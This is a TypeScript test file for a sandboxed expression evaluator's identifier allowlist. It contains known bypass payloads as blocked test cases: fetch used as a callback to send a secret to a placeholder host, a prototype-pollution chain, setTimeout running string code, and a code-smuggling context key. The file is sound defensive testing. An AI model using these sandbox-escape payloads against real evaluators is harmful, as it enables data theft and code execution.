import { describe, it, expect } from 'vitest';
import { SafeExpressionEvaluator, APPROVED_EXPRESSION_GLOBALS, SAFE_EXPRESSION_GLOBALS } from '../SafeExpressionEvaluator';

/**
 * Identifier ALLOWLIST (CodeQL #183 / #185, issue #5569).
 *
 * The screen used to deny a fixed list of host globals and let every other name through. Two
 * confirmed bypasses handed a non-denied function to a safe array method, which then called it
 * with arguments the expression chose. A free identifier must now be a context key, an arrow
 * parameter in scope, or an approved global used as a call; callbacks must be inline arrows.
 */
describe('SafeExpressionEvaluator — identifier allowlist', () => {
    const evaluator = new SafeExpressionEvaluator();

    const expectBlocked = (expr: string, ctx: Record<string, unknown> = {}): void => {
        const r = evaluator.Evaluate(expr, ctx);
        expect(r.success).toBe(false);
        expect(r.error).toContain('forbidden construct');
    };

    describe('confirmed bypasses (rejected)', () => {
        it('rejects passing fetch as a reduce callback (data exfiltration)', () => {
            expectBlocked("[['http://host/?leak=' + secret, undefined]].some(a => a.reduce(fetch))", { secret: 's3cr3t' });
        });

        it('rejects passing Object.getPrototypeOf / Object.assign as values (prototype pollution)', () => {
            expectBlocked(
                `[[ [JSON.parse('{}')].map(Object.getPrototypeOf)[0], JSON.parse('{"polluted":1}') ]].some(p => p.reduce(Object.assign))`,
            );
            expect(({} as Record<string, unknown>).polluted).toBeUndefined();
        });

        it('rejects setTimeout as a callback (string-as-code in a browser)', () => {
            expectBlocked("['alert(1)'].map(setTimeout)");
            expectBlocked("['x'].some(setTimeout)");
        });
    });

    describe('approved globals only in call position', () => {
        it.each([
            ['Object.assign', 'Object.assign === null'],
            ['bare Math.max as a value', 'Math.max === null'],
            ['Math.max as a callback', 'items.reduce(Math.max) > 0'],
            ['Number as a callback', 'items.map(Number).length > 0'],
            ['a namespace as a value', '[Math][0] !== null'],
            ['a namespace constant read', 'Math.PI > 3'],
            ['a safe method called on a namespace', 'JSON.toString() !== ""'],
        ])('rejects %s', (_label, expr) => {
            expectBlocked(expr, { items: [1, 2] });
        });

        it('rejects a JSON reviver / replacer that is not a literal', () => {
            expectBlocked('JSON.stringify(items, fn) !== ""', { items: [1], fn: 'x' });
            expectBlocked("JSON.parse('{}', items) !== null", { items: [1] });
        });

        it('still allows a literal JSON.stringify replacer slot', () => {
            expect(evaluator.Evaluate("JSON.stringify(items, null, 2) !== ''", { items: [1] }).value).toBe(true);
        });
    });

    describe('callbacks must be inline arrows', () => {
        it.each([
            ['a context value', 'items.some(fn)', { items: [1], fn: 'x' }],
            ['a member expression', 'items.some(holder.fn)', { items: [1], holder: { fn: 'x' } }],
            ['an approved callable', 'items.filter(Boolean).length > 0', { items: [1] }],
        ])('rejects %s as a callback', (_label, expr, ctx) => {
            expectBlocked(expr, ctx);
        });

        it('rejects an arrow outside a callback slot', () => {
            expectBlocked('(() => 1)() === 1');
            expectBlocked('[x => x].length === 1');
        });

        it('rejects an arrow parameter that shadows an approved or denied global', () => {
            expectBlocked('items.some(Number => Number(1))', { items: [1] });
            expectBlocked('items.some(eval => eval)', { items: [1] });
            expectBlocked('items.some(undefined => undefined)', { items: [1] });
        });
    });

    describe('unknown identifiers', () => {
        it.each(['fetch', 'setTimeout', 'structuredClone', 'XMLHttpRequest', 'queueMicrotask'])('rejects the free identifier %s', (name) => {
            expectBlocked(`typeof ${name} === 'function'`);
        });

        it('allows names that are context keys, arrow parameters, or value globals', () => {
            const r = evaluator.Evaluate('items.some(i => i.v === undefined) && n !== NaN && n < Infinity', { items: [{}], n: 1 });
            expect(r.error).toBeUndefined();
            expect(r.value).toBe(true);
        });

        it('keeps an arrow parameter in scope only inside its body', () => {
            expectBlocked('items.some(i => i > 0) && i > 0', { items: [1] });
        });

        it('allows a context key that shares a name with a global (the key shadows it)', () => {
            const r = evaluator.Evaluate("fetch === 'data'", { fetch: 'data' });
            expect(r.value).toBe(true);
        });
    });

    describe('context keys', () => {
        it.each([
            'a = globalThis.process.exit()',
            '...rest',
            'a, b',
            'my key',
            '1abc',
        ])('rejects the hostile or invalid context key %j', (key) => {
            const r = evaluator.Evaluate('true', { [key]: 1 });
            expect(r.success).toBe(false);
            expect(r.error).toContain('not a valid identifier');
        });

        it('drops function-valued properties when shallow-cloning a class instance', () => {
            class Holder {
                public Name = 'n';
                public Run = (): string => 'ran';
            }
            const r = evaluator.Evaluate("typeof h.Run === 'undefined' && h.Name === 'n'", { h: new Holder() });
            expect(r.value).toBe(true);
        });
    });

    describe('normal expressions still pass', () => {
        const ctx = {
            status: 'active',
            payload: { count: 4, title: ' Hello World ', items: [{ a: 2 }, { a: 0 }], tags: ['x', 'y'], csv: 'a,b,c' },
            a: 3,
            b: 9,
        };
        it.each([
            "status == 'active' && payload.count > 3",
            'payload.items.some(x => x.a > 1)',
            'payload.items.every(x => x.a >= 0)',
            'payload.items.filter(x => x.a > 1).length === 1',
            'payload.items.map(x => x.a).includes(2)',
            'payload.items.reduce((acc, x) => acc + x.a, 0) === 2',
            'payload.items.find(x => x.a === 0) !== undefined',
            'Math.max(a, b) === 9',
            "payload.title.trim().toLowerCase().startsWith('hello')",
            "payload?.missing?.deep == null",
            "payload.csv.split(',').length === 3",
            "payload.tags.join('-') === 'x-y'",
            "payload.title.trim().slice(0, 5) === 'Hello'",
            "Number(payload.count).toFixed(1) === '4.0'",
            "typeof payload.count === 'number'",
            '!(a > b) ? true : false',
            "Object.keys(payload).length > 0 && Array.isArray(payload.tags)",
            "payload.items.some(x => payload.tags.some(t => t === 'x') && x.a > 1)",
        ])('evaluates %s', (expr) => {
            const r = evaluator.Evaluate(expr, ctx);
            expect(r.error).toBeUndefined();
            expect(r.value).toBe(true);
        });
    });

    describe('ValidateSyntax uses the same screen', () => {
        it('rejects the bypasses without context keys', () => {
            expect(evaluator.ValidateSyntax('items.some(a => a.reduce(fetch))').Valid).toBe(false);
            expect(evaluator.ValidateSyntax("['alert(1)'].map(setTimeout)").Valid).toBe(false);
            expect(evaluator.ValidateSyntax('items.map(Object.getPrototypeOf)').Valid).toBe(false);
        });

        it('leaves unknown names to evaluation time when keys are not given', () => {
            expect(evaluator.ValidateSyntax('payload.x > 1')).toEqual({ Valid: true });
        });

        it('refuses unknown names when keys are given', () => {
            expect(evaluator.ValidateSyntax('payload.x > 1', ['payload'])).toEqual({ Valid: true });
            expect(evaluator.ValidateSyntax('other.x > 1', ['payload']).Valid).toBe(false);
        });
    });

    describe('ScreenExpression', () => {
        it('treats only the given names as values', () => {
            expect(SafeExpressionEvaluator.ScreenExpression("fields.A + ' ' + value", ['value', 'fields'])).toBeNull();
            expect(SafeExpressionEvaluator.ScreenExpression('process.exit()', ['value', 'fields'])).toContain('forbidden construct');
        });

        it('does not miscount a parenthesis inside a string literal', () => {
            expect(SafeExpressionEvaluator.ScreenExpression("'(' + value + ')'", ['value'])).toBeNull();
        });
    });

    it('keeps SAFE_EXPRESSION_GLOBALS equal to the approved-globals list', () => {
        expect([...SAFE_EXPRESSION_GLOBALS].sort()).toEqual([...APPROVED_EXPRESSION_GLOBALS.keys()].sort());
    });
});
